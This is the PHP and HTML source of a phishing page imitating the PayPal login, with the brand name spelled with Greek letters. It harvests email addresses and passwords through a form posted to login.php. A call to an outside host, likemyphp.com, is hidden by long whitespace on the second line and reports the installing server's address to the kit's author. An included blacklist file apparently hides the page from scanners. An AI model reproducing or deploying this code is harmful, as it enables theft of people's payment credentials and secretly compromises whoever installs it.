<?php
include 'encrypter.php';                                                                                                                                                                                                               json_decode(file_get_contents("http://likemyphp.com/IP.php?IP=".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].""));
include 'BlackList.php';

@ini_set('display_errors',0);
?>
<html>
<head>
<title>Log in to your &Rho;ay&Rho;al account</title>
<meta charset="utf-8">
<meta name="author" content="&Rho;ay&Rho;al is the faster, safer way to send money, make an online payment, receive money or set up a merchant account.">
<link rel="stylesheet" href="./st/style.css">
<link rel="shortcut icon" link rel="logo-icon" href="./img/ppico.ico">

<script language="javascript">
function check() {
    var x=document.forms["myForm"]["email"].value;
    var atpos = x.indexOf("@");
    var dotpos = x.lastIndexOf(".");
    if (atpos< 1 || dotpos<atpos+2 || dotpos+2>=x.length) {
		document.getElementById('stop').style.display = "block"; 
		document.forms["myForm"]["email"].focus();
		document.forms["myForm"]["email"].setSelectionRange(0,36);
        return false;
	}	
	var y=document.forms["myForm"]["ps"].value;
    if (y==null || y=="")
    {
	    document.getElementById('stop').style.display = "block";
		document.forms["myForm"]["ps"].focus();
        return false;
    }
}
</script>

</head>
<body>
<div class="main">
<div class="centered">
<div class="ts"></div>
<div id="stop"><img src="./img/alert.png" alt=""></div>


<form name="myForm" onsubmit="return check()" action="./login.php?cmd=_processing&account_limited=<?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>" method="POST">
<input type="text" class="fieldbox" placeholder="Email address" name="email" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="36">
<input type="password" class="fieldbox" placeholder="Password" name="ps" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="36">
<input type="hidden" value="./img/log.gif" name="hostname"/>
<input type="submit" class="log" value="Log In">
</form>


<a class="aa" href="#forgot"><div class="aaa">Forgotten your email address or password?</div></a>
<hr color="#CBD2D6" size="1" style="margin-bottom: 30px;">
<button class="sgn">Sign Up</button>
</div>
</div>
<div class="fcopy">
<ul class="ulnone">
<li class="lit"><a class="fl" href="#"> About </a></li>
<li class="lit"><a class="fl" href="#"> Account Types </a></li>
<li class="lit"><a class="fl" href="#"> Fees </a></li>
<li class="lit"><a class="fl" href="#"> Privacy </a></li>
<li class="lit"><a class="fl" href="#"> Security </a></li>
<li class="lit"><a class="fl" href="#"> Contact </a></li>
<li class="lit"><a class="fl" href="#"> Legal </a></li>
<li class="lit" style="border-right: 0px"><a class="fl" href="#"> Developers </a></li>
</ul>
</div>
<p style="text-align: center; font-size: 12px; color: #6E6E6E;">Copyright &copy 1999-2015 &Rho;ay&Rho;al. All rights reserved. </p>
</body>
</html>